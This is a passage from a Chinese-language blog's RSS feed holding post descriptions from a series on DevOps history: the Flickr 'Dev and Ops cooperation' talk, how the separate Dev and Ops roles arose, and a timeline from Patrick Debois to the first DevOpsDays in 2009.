Jenkins 最佳实践：https://wiki.jenkins-ci.org/display/JENKINS/Jenkins+Best+Practices</description></item><item><title>DevOps 前世今生 - DevOps 的目标和核心</title><link>https://wwww.guyu.me/posts/2017-02-14-core-devops-concepts/</link><pubDate>Tue, 14 Feb 2017 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2017-02-14-core-devops-concepts/</guid><description>在#DevOps的前世今生# 2. Dev和Ops矛盾缘何而来？一文中，通过Dev和Ops的历史发展总结出了Dev和Ops矛盾的历史渊源，以及 Dev 和 Ops 的核心矛盾：
Dev和Ops 的矛盾主要是面向适应性的敏捷软件交付和面向经验性的传统运维之间的矛盾。
但这个矛盾最先 John Allspaw 和 Paul Hammond在 “10+ Deploys Per Day： Dev and Ops Cooperation at Flickr” 提出，并以“Cooperation”作为整个演讲的核心，讲述了他们解决这个矛盾的实践经验。这个演讲中：
重新定义Ops的工作目标 # 在一个组织中，如果相关利益者的利益不一致，在既定流程的进行中一定会碰到诸多阻力。而在这一点上，首先做得就是把 Dev 和 Ops 的利益一致化，从而减少Ops对软件交付的阻力。在演讲中，John Allspaw 和 Paul Hammond 首先挑战的是对 Dev 和 Ops 的传统观点。
传统的观点认为Dev和Ops的工作是不同的：
Dev的工作是增添新的功能。
Ops的工作是保证站点的稳定和高性能。
他们认为，保证站点的稳定和高性能不是 Ops 的工作目标。
Ops的工作目标应该是激活业务（enable the business），而这一点和Dev是一致的。
理想往往是美好的，现实往往是残酷的。激活业务会带来更多的变更，而更多的变更会引起故障！
面对这样的问题，就需要做出一个选择：为了保障稳定性减少变更，还是及时按需变更？
阿拉伯有一个谚语：“你若不想做，会找到一个借口。你若想做，会找到一个方法。”
Flicker 并没有屈服于压力，他们选择让问题向目标妥协，而不是目标向问题妥协。他们的手段是：
构建相互合作的工具和文化 # 降低变更风险的关键就是在于提高可靠性，这不仅仅是Dev在软件开发中，也需要Ops把可靠性通过非功能性需求（性能要求，扩展性，安全性等）注入到软件开发过程中。通过系统交付过程中的质量內建而不是事后检验来提升交付质量。
而 Dev 和 Ops 的具体矛盾点表现在以下两方面：
在价值流下游的 Ops 评审认为价值链上游的 Dev 软件非功能质量不满足要求，因此阻止变更。
在价值流上游的 Dev 无法获得价值链下游的 Ops 的真实运行环境，因此无法提升交付质量。
于是，逐渐陷入了“无法提升质量”和“ 非功能质量不满足要求”的死循环中。
由于在 Dev 环节关心的是功能性需求，往往忽略了非功能性需求，而 Ops 更关注的是非功能性需求。所以通过质量內建，把运维加入开发反馈环。在开发环节中增加非功能性的需求的实现和验收，让 Ops 担任最终的 QA 的角色。从而提升了交付质量，也提升了反馈速度。
首先，他们通过**基础设施自动化（Automated infrastructure）**提升了基础设施准备的质量和效率。
其次，他们搭建了Dev和Ops 交付的桥梁：**共享版本控制（Shared Version Control ）并且通过功能开关（Feature flags ）**管理功能发布。
然后，通过**一步构建和部署（One step build and deploy ）以及频繁进行小变更（Small frequent changes）**提升单向价值流速度并降低部署风险。</description></item><item><title>DevOps 前世今生 - DevOps 矛盾从何而来</title><link>https://wwww.guyu.me/posts/2017-01-17-where-did-devops-issues-come/</link><pubDate>Fri, 27 Jan 2017 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2017-01-17-where-did-devops-issues-come/</guid><description>在#DevOps的前世今生# 1.DevOps编年史一文中，通过追溯 DevOps 活动产生的历史起源，我们发现了 DevOps 是敏捷思想从软件开发端(Dev)到系统维护端(Ops)的延伸。无论是 DevOpsDays 的创始人 Patrick Debois，还是同时期的 The Agile Admin。都想通过敏捷来改进传统的系统维护工作以及软件开发部门和系统维护部门的合作关系。但是，DevOps 的矛盾从何而来？这还要从 Dev 和 Ops 的起源开始讲起。
上古时代——抱着计算机使用手册，自开发自运维 # 历史要追溯到刚刚出现计算机的时期。当时，软件开发还是少数人通过高学历才能够掌握的技能，那个时候只有“程序”（Program），但没有“软件”（Software），所以那个时候编写程序的人员被称为“程序员”（Programmer）。基本的学习材料还只是计算机设备厂商附送的使用手册。所以，只能先购买设备，再自己培养人才。
最先购买计算机的是科研单位，军队，政府以及少数大型企业。同时组建了新的部门，成立了信息技术部（IT Department)，或者叫信息化办公室（IT Office）。在中国的有些单位里干脆直接叫“电脑部”。他们一个科室，一个办公室主任，外加两三个科级干部和几个科员，专门管理这些电脑的使用情况，并且学习软件编程技术，用程序来解决其它各部门的。
这是最初的IT运维雏形，在这个时期是没有 Dev 和 Ops 之分的，他们统称为 Programmer。由于开发和运维都由同样的人包揽，自己维护自己开发的程序，也可以被看做是原始的 DevOps。这个时期的计算机系统和问题较简单，开发和维护并不复杂，无需进行专业区分。
桌面通用软件时代——软件成为了一门生意，出现了专业的软件开发工程师（Dev） # 随着计算机的成本不断下降，尤其是以 IBM PC 为代表微型计算机（ MicroComputer ）开始普及。企业也开始大规模使用计算机进行办公。由于软件开发人员数量仍然很少，加之需求很旺盛，专业的软件开发人员成本依然高昂。
最开始的时候，软件仅仅通过磁盘拷贝进行流传，某些介绍计算机或者软件的杂志开了先河。程序员通过磁盘向杂志社投稿，杂志社通过变卖杂志和软件获利。由于软件的边际生产成本几乎是0，所以渐渐有人把销售软件变成了一门生意。随着软件的扩展，当初为个人目的（Personal Purpose）所编写的软件渐渐的开始走通用化的路线，慢慢形成了软件产品。接着有了专门从事软件开发的公司，并逐渐成为一个产业。并且有了软件开发工程师（Developer，简称Dev）这个职业。
在这个时期，开发软件仍然是很专业的事情，企业的IT部门要想开发软件的代价十分高昂。因此，大部分单位，组织和企业通过购买的形式获得软件。IT部门逐渐成为了负责信息化采购以及软硬件基本操作培训的部门。此外，由于信息化发展加速，各行各业软件层出不穷，加之软件企业越来越多，IT部门不得不通过更广泛的学习了解技术的变化。
企业级定制化软件时代——企业级应用的快速发展，出现了专业的系统维护工程师（Ops） # 随之带来的问题是：无论企业买来多少软件，企业的信息化需要仍然无法被满足。一台台电脑成为了企业的信息孤岛，解决了信息的分析和存储问题最多实现了无纸化办公。没有让部门间的信息有效的流动起来。大型企业最先发现这些问题并且给出了最初的解决方案，使得企业级软件开发和系统集成（System Integration）慢慢成为了一个热门的领域。
企业级软件系统最大的特点是通过计算机网络解决了企业内部的信息孤岛。但这样的系统无法在PC上运行需要专业的工作站，服务器以及网络设备。而这些设备的管理就理所当然的成为了企业IT部门的职责。
随着软硬件技术的发展，特别企业级应用开发的经验不断积累，设备的采购成本和软件的开发成本进一步降低。大型IT厂商开始瞄准企业级应用市场，尤其是IBM，Oracle和EMC推出了相应的产品。使得软件定制开发的成本不断下降。加之随着开发人员越来越多，开发成本逐渐降低，于是出现了企业定制化软件开发，出现了MIS和ERP这样的应用以及J2EE这样的企业级软件开发框架。
在这个过程中，IT运维的概念逐渐产生，维基百科上是这样定义IT运维（IT Operations）的：
IT Operations is responsible for the smooth functioning of the infrastructure and operational environments that support application deployment to internal and external customers, including the network infrastructure; server and device management; computer operations; IT infrastructure library (ITIL) management; and help desk services for an organization.
翻译成中文就是：
IT运维的责任是要为内部和外部客户的应用部署提供平滑的基础设施和操作环境，包括网络基础设施，服务器和设备管理，计算机操作，ITIL管理，甚至作为组织的IT帮助中心。</description></item><item><title>DevOps 前世今生 - DevOps 编年史</title><link>https://wwww.guyu.me/posts/2016-11-27-devops-annals/</link><pubDate>Sun, 27 Nov 2016 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2016-11-27-devops-annals/</guid><description>2007 年：比利时，一个沮丧的独立IT咨询师 # DevOps的历史要从一个比利时的独立IT咨询师说起。这位咨询师的名字叫做**Patrick Debois，**他喜欢从各个角度研究IT组织。
2007 年，Patrick参与了比利时一个政府下属部门的大型数据中心迁移的项目。在这个项目中，他负责测试和验证工作。所以他不光要和开发团队（Dev）一起工作，也要和运维团队（Ops）一起工作。他第一天在开发团队跟随敏捷的节奏，第二天又要以传统的方式像消防队员那样维护这些系统，这种在两种工作氛围的切换令他十分沮丧。
他意识到开发团队和运维团队的工作方式和思维方式有巨大的差异：开发团队和运维团队生活在两个不同的世界，而彼此又坚守着各自的利益，所以在这两者之间工作到处都是冲突。作为一个敏捷的簇拥者，他渐渐的明白如何在这种状况下改进自己的工作。
2008 年 6月：美国旧金山，第一届 Velocity 大会 # 2008 年，在美国加州旧金山，O&amp;rsquo;Reilly出版公司举办了一场名为Velocity的技术大会，这个大会的话题范围主要围绕Web应用程序的性能和运维展开。这个会议被设计用来分享和交换构建和运维Web应用的性能、稳定性和可用性上的最佳实践。
2008 年 8月：加拿大多伦多，Agile Conference 2008 大会埋下了DevOps的种子 # 同年 8月，在加拿大多伦多的 Agile Conference 2008（敏捷大会）上，一位名为 Andrew Shafer 的人提交了一个名为“Agile Infrastructure”的临时话题。由于对这个临时话题感兴趣的人不多，Andrew 认为没人会对如何 跨越 Dev 和 Ops 的鸿沟 这个话题感兴趣。所以当这个话题时间开始的时候，作为话题提交人的 Andrew 并没有出现。
但是话题开始的时候，仅有一个人出席。这个人就是上文提到的IT咨询师 Patrick 。Partrik 在这次会议上分享了自己的话题：**如何在运维工作中应用 Scrum 和其它敏捷实践。**他十分想把这些经历和别人分享。
最终，Patrick 在会议厅的走廊里找到了 Andrew，并进行了一场漫长的讨论。他们意识到在这次会议之外会有很多的人想要继续探讨这个广泛而又系统化的问题。
尽管在这次会议中，持续集成的流行已经使敏捷实践慢慢走向部署了。可是这仍然把运维工作和开发完全割裂开。于是他俩决定在 Google Group 上建立了一个 Agile System Adminstration 的讨论组继续这个话题。虽然有一些话题和参与者，但是访问者寥寥。
2009 年 6月：美国圣荷西，第二届 Velocity 大会上一个轰动世界的演讲 # 这一年的 Velocity 大会最大的亮点是一个名为“10+ Deploys Per Day: Dev and Ops Cooperation at Flickr”的演讲，几乎所有的和 DevOps 相关的资料都会把这个演讲作为 DevOps 的引用。这个演讲的内容可以作为 DevOps 萌发的标志。这个演讲提出了了 DevOps 的“一个中心，两个基本点”——以业务敏捷为中心，构造适应快速发布软件的工具（Tools）和文化（Culture）。
Patrick 在网上看到了这个视频后很兴奋，因为这就是他一直致力于的领域。于是他在Twitter 上问如何才能参加 Velocity 大会。
其中有个人回复: 嘿，Patrick，你想在比利时召开自己的 Velocity 吗？我们都会去参加，这一定会很棒。于是，Patrick 就想通过 Twitter 召集开发工程师和运维工程师在比利时举办一个类似于 Velocity 的大会。
2009 年 10 月：比利时根特，第一届 DevOpsDays # 如果要召开一个会议，就得有一个名字。Patrick 首先就想到了Dev和Ops，由于这个会议会持续两天，所以他加上了 Days，于是就有了 DevOpsDays。由于 Twitter 上有140个字符的限制，因此他想用 DOD 作为 DevOpsDays 的缩写以提醒自己“死在交付上”（Dead On Delivery），但不知什么原因，最后没有这么做。</description></item></channel></rss>